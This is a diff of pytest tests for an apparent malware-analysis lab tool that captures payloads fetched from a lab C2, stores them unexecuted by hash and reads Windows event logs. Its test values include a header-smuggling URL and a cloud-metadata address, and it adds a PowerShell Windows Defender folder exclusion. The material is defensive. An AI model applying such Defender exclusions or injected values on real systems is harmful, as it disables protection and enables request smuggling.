+    assert out["error"] == f"HTTP {status}" and "sha256" not in out
+    assert tdc._capture_store() == []
+
+
+def test_an_empty_answer_stores_nothing(fw, tdc):
+    fw.body = b""
+    assert tdc._fetch_capture(FINDING)["error"] == "empty response" and tdc._capture_store() == []
+
+
+def test_a_declared_size_over_the_limit_is_refused_before_reading(fw, tdc):
+    fw.script = [(200, {"Content-Length": str(tdc.FETCH_MAX_BYTES + 1)}, b"MZ")]
+    assert tdc._fetch_capture(FINDING)["error"] == "too large"
+
+
+def test_the_whole_fetch_has_a_time_limit(fw, tdc, monkeypatch):
+    monkeypatch.setattr(tdc, "FETCH_TIMEOUT", 0)
+    assert tdc._fetch_capture(FINDING)["error"] == "timed out" and fw.fetches == []
+
+
+@pytest.mark.parametrize("ip", ["127.0.0.1", "::1", "0.0.0.0", "224.0.0.1", "169.254.169.254", "::ffff:127.0.0.1",
+                                "not-an-ip", None])
+def test_the_vms_own_side_is_never_fetched_from(fw, tdc, ip):
+    url = f"http://{ip}:8080/a.dll" if ip else URL
+    out = tdc._fetch_capture({**FINDING, "dst_ip": ip, "url": url})
+    assert out["error"] and fw.fetches == []
+
+
+def test_a_lan_address_is_allowed_for_a_lab_c2(fw, tdc):
+    out = tdc._fetch_capture({**FINDING, "dst_ip": "192.168.64.1", "url": "http://192.168.64.1:8080/a.dll"})
+    assert out["sha256"]
+
+
+@pytest.mark.parametrize("url", ["ftp://203.0.113.50:8080/a.dll", "http://203.0.113.50:9999/a.dll", "javascript:1",
+                                 "http:///a.dll", "http://203.0.113.50:8080/a b\r\nX: y", "x" * 9000, None, 5])
+def test_a_url_that_does_not_match_the_observation_is_refused(fw, tdc, url):
+    out = tdc._fetch_capture({**FINDING, "url": url})
+    assert out["error"] and fw.fetches == []
+
+
+def test_the_file_is_stored_by_hash_without_an_extension_and_is_not_touched_again(fw, tdc):
+    fw.body = b"MZ\x90\x00" + b"\x01" * 64
+    out = tdc._fetch_capture(FINDING)
+    sha = out["sha256"]
+    path = os.path.join(str(fw.samples), sha[:2], sha)
+    assert out["path"] == path and open(path, "rb").read() == fw.body
+    assert out["size"] == len(fw.body) and out["executed"] is False
+    assert not os.listdir(os.path.join(str(fw.samples), ".incoming"))
+    again = tdc._fetch_capture(FINDING)
+    assert again["sha256"] == sha and len(tdc._capture_store()) == 2          # two fetches, one file, two records
+
+
+@pytest.mark.parametrize("head, magic", [(b"MZ\x90", "MZ"), (b"\x7fELFxx", "ELF"), (b"PK\x03\x04x", "PK"),
+                                         (b"#!/bin/sh", "#!"), (b"hello ok", "text"), (b"\x00\x01\x02\x03", "unknown")])
+def test_the_magic_comes_from_the_first_bytes(fw, tdc, head, magic):
+    fw.body = head + b"\x00" * 16 if magic in ("unknown",) else head + b" more"
+    assert tdc._fetch_capture(FINDING)["magic"] == magic
+
+
+def test_the_capture_carries_what_the_spec_lists(fw, tdc):
+    fw.store.add_processes([{"timestamp": iso(-60), "event_id": 1, "pid": "4812", "image": IMAGE, "commandline": "",
+                             "parent_pid": "900", "parent_image": "x"}])
+    tdc._load_submissions = lambda: [{"id": "sub42", "agent_pid": 900, "timestamp": iso(-90)}]
+    out = tdc._fetch_capture({**FINDING, "dst_ip": "203.0.113.50"})
+    assert {"id", "sha256", "size", "url", "dst_ip", "geo", "pid", "image", "fetched_at", "origin", "content_type",
+            "magic", "submission_id", "executed"} <= set(out)
+    assert out["origin"] == "fetch" and out["submission_id"] == "sub42" and out["url"] == URL
+    assert out["geo"]["scope"] == "public"
+
+
+def test_the_capture_routes(client, fw, tdc):
+    assert client.get("/api/firewall/capture/nope").status_code == 404
+    one, two = tdc._fetch_capture(FINDING), tdc._fetch_capture({**FINDING, "url": URL + "?2"})
+    listed = client.get("/api/firewall/captures").json["captures"]
+    assert [c["id"] for c in listed] == [two["id"], one["id"]]
+    detail = client.get("/api/firewall/capture/" + one["id"]).json
+    assert detail["exists"] is True and detail["sha256"] == one["sha256"]
+    os.remove(detail["path"])
+    assert client.get("/api/firewall/capture/" + one["id"]).json["exists"] is False
+
+
+def test_a_flow_lists_the_captures_of_its_endpoint(client, fw, tdc):
+    fw.store.add_connections([conn()])
+    cap = tdc._fetch_capture(FINDING)
+    assert client.get("/api/firewall/connections").json["connections"][0]["capture_ids"] == [cap["id"]]
+    assert client.get("/api/firewall/summary").json["captures"] == 1
+
+
+def test_the_capture_store_keeps_500_entries_and_survives_a_damaged_file(fw, tdc):
+    for i in range(tdc.MAX_CAPTURES + 3):
+        tdc._record_capture({"sha256": "a" * 64, "url": f"http://x/{i}"})
+    store = tdc._capture_store()
+    assert len(store) == tdc.MAX_CAPTURES and store[-1]["url"].endswith(str(tdc.MAX_CAPTURES + 2))
+    assert len({c["id"] for c in store}) == tdc.MAX_CAPTURES
+    with open(tdc.CAPTURES_FILE, "w") as f:
+        f.write("{not json")
+    assert tdc._capture_store() == []
+    assert tdc._record_capture({"sha256": "b" * 64})["id"]
+
+
+def test_a_capture_is_readable_for_download_and_not_a_write_target(client, fw, tdc):
+    out = tdc._fetch_capture(FINDING)
+    assert tdc.CAPTURE_DIR in tdc._readable_roots()
+    assert tdc._readable(out["path"])
+    assert client.get("/api/file/download", query_string={"path": out["path"]}).status_code == 200
+    assert not [n for n in dir(tdc) if "write_roots" in n.lower() or "writable_roots" in n.lower()]
+
+
+# ---- the capture directory and its Defender exclusion ----------------------------------------
+
+
+def test_the_capture_directory_is_created_and_excluded_from_defender(fw, tdc, tmp_path, monkeypatch):
+    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(tmp_path / "new" / "samples"))
+    calls = []
+    assert tdc._ensure_capture_dir(lambda args: calls.append(args) or (0, "", "")) is True
+    assert os.path.isdir(tdc.CAPTURE_DIR)
+    (args,) = calls
+    assert args[0].lower().endswith("powershell.exe") and "-Command" in args
+    assert "Add-MpPreference -ExclusionPath" in args[-1] and tdc.CAPTURE_DIR in args[-1]
+    assert tdc._ensure_capture_dir(lambda args: (0, "", "")) is True               # idempotent
+
+
+def test_a_failing_exclusion_only_logs(fw, tdc, tmp_path, monkeypatch, caplog):
+    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(tmp_path / "s"))
+    assert tdc._ensure_capture_dir(lambda args: (1, "", "denied")) is False
+    assert tdc._ensure_capture_dir(lambda args: 1 / 0) is False
+    blocker = tmp_path / "file"
+    blocker.write_text("x")
+    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(blocker / "sub"))
+    assert tdc._ensure_capture_dir(lambda args: (0, "", "")) is False
+
+
+def test_the_provisioning_script_excludes_the_capture_directory():
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    text = open(os.path.join(root, "scripts", "install-webui.ps1"), encoding="utf-8").read()
+    assert re.search(r'Add-MpPreference -ExclusionPath "C:\\tdc\\samples"', text)
+
+
+def test_the_requirements_did_not_grow():
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    lines = [l.strip() for l in open(os.path.join(root, "webui", "requirements.txt")) if l.strip()]
+    assert lines == ["flask>=3.0", "requests>=2.31", "watchdog>=4.0", "pefile>=2023.2.7"]
+
+
+# ---- the readers -----------------------------------------------------------------------------
+
+
+class _Proc:
+    def __init__(self, text="", rc=0, err=b""):
+        self.stdout, self.returncode, self.stderr = text.encode("utf-16-le"), rc, err
+
+
+def _xml(record, eid=59, url="http://x.example/a.exe", pid=2000):
+    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>{eid}</EventID>'
+            f'<TimeCreated SystemTime="2026-11-16T10:00:00.1234567Z"/><EventRecordID>{record}</EventRecordID>'
+            f'<Execution ProcessID="{pid}"/><Security UserID="S-1-5-18"/></System><EventData>'
+            f'<Data Name="name">job</Data><Data Name="Url">{url}</Data></EventData></Event>')
+
+
+@pytest.fixture
+def wevt(tdc, monkeypatch):
+    seen = []
+    answers = []
+
+    def query(log, query=None, count=None, newest_first=True, timeout=30):
+        seen.append({"log": log, "query": query, "count": count, "newest_first": newest_first})
+        text = answers.pop(0) if answers else ""
+        return text, _Proc(text)
+
+    monkeypatch.setattr(tdc, "_wevtutil_query", query)
+    monkeypatch.setattr(tdc, "_IS_WINDOWS", True)
+    return type("W", (), {"seen": seen, "answers": answers})
+
+
+def test_the_powershell_reader_reports_the_logs_newest_id_when_nothing_new_came_back(tdc, wevt):
+    wevt.answers[:] = ["", _xml(777, eid=4104)]
+    events, newest = tdc._fw_read_powershell(since=500)
+    assert events == [] and newest == 777
+    assert "EventRecordID>500" in wevt.seen[0]["query"] and wevt.seen[1]["count"] == 1 and wevt.seen[1]["newest_first"]
+
+
+def test_a_cleared_powershell_log_is_visible_to_the_collector(tdc, wevt):
+    wevt.answers[:] = ["", _xml(3, eid=4104)]
+    _, newest = tdc._fw_read_powershell(since=900)
+    assert newest == 3 < 900
+
+
+def test_an_empty_log_reports_zero_and_the_first_read_is_the_last_day(tdc, wevt):
+    wevt.answers[:] = ["", ""]
+    assert tdc._fw_read_powershell(since=None)[1] == 0
+    assert "timediff" in wevt.seen[0]["query"] and wevt.seen[0]["newest_first"] is True
+
+
+def test_events_that_came_back_report_the_newest_of_them_not_the_log(tdc, wevt):
+    wevt.answers[:] = [_xml(10, eid=4104) + _xml(12, eid=4104)]
+    events, newest = tdc._fw_read_powershell(since=5)
+    assert newest == 12 and len(wevt.seen) == 1 and events
+
+
+def test_bits_events_carry_record_id_url_and_no_requester_pid(tdc, wevt):
+    wevt.answers[:] = [_xml(31, 60, "http://a/b.exe") + _xml(30, 59)]
+    events, newest = tdc._fw_read_bits(since=20)
+    assert newest == 31 and [e["record_id"] for e in events] == [30, 31]
+    assert events[0]["event_id"] == 59 and events[0]["data"]["url"] == "http://x.example/a.exe"
+    assert "pid" not in events[0] and events[0]["timestamp"].startswith("2026-11-16T10:00:00")
+    assert "(EventID=59 or EventID=60)" in wevt.seen[0]["query"]
+
+
+def test_the_log_readers_say_why_they_fail(tdc, monkeypatch):
+    monkeypatch.setattr(tdc, "_IS_WINDOWS", False)
+    with pytest.raises(RuntimeError, match="only available on the VM"):
+        tdc._fw_read_bits()
+    monkeypatch.setattr(tdc, "_IS_WINDOWS", True)
+    monkeypatch.setattr(tdc, "_wevtutil_query", lambda *a, **k: ("", type("P", (), {"stdout": b"", "returncode": 15007,
+                                                                                    "stderr": b"The channel was not found."})()))
+    with pytest.raises(RuntimeError, match="channel was not found"):
+        tdc._fw_read_powershell(since=1)
+
+
+def test_the_firewall_reader_always_answers_with_an_int_offset(tdc, monkeypatch):
+    log = ("#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin "
+           "icmptype icmpcode info path pid\n"
+           "2026-11-16 10:00:00 DROP TCP 10.0.2.15 203.0.113.50 51000 8080 60 S 1 0 64240 - - - SEND 4812\n")
+    monkeypatch.setattr(tdc, "_read_firewall_log", lambda offset: (log, 321, ""))
+    reader = tdc._FirewallLogReader()
+    events, offset = reader(since=None)
+    assert offset == 321 and isinstance(offset, int) and events[0]["fields"]["dst_ip"] == "203.0.113.50"
+    monkeypatch.setattr(tdc, "_read_firewall_log", lambda offset: ("", 400, ""))
+    assert reader(since=321) == ([], 400)
+    monkeypatch.setattr(tdc, "_read_firewall_log", lambda offset: ("", None, "The firewall log does not exist yet"))
+    with pytest.raises(RuntimeError, match="does not exist"):
+        reader(since=400)
+
+
+def test_the_readers_fit_the_collector(tdc, fw, monkeypatch):
+    readers = tdc._firewall_readers()
+    assert set(readers) == set(tdc.firewall_store.SOURCES)
+    assert readers["connections"] is readers["dns"] is readers["processes"] is tdc._read_sysmon_for_logs
+    calls = []
+    monkeypatch.setattr(tdc, "_read_sysmon_events", lambda **kw: calls.append(kw) or [])
+    monkeypatch.setattr(tdc, "_IS_WINDOWS", True)
+    assert readers["dns"](event_ids=[22], since_iso="2026-11-16T10:00:00Z") == []
+    assert calls[0]["event_ids"] == [22] and calls[0]["since"] == "2026-11-16T10:00:00Z"
+
+
+def test_the_loop_ticks_then_sweeps_and_survives_both_failing(tdc, monkeypatch):
+    order = []
+
+    class Collector:
+        def tick(self):
+            order.append("tick")
+            raise RuntimeError("boom")
+
+        def interval(self):
+            return 1.0
+
+    monkeypatch.setattr(tdc, "_firewall_sweep", lambda now=None: order.append("sweep") or 1 / 0)
+    slept = []
+    tdc._firewall_loop(Collector(), rounds=2, sleep=slept.append)
+    assert order == ["tick", "sweep"] * 2 and slept == [1.0, 1.0]
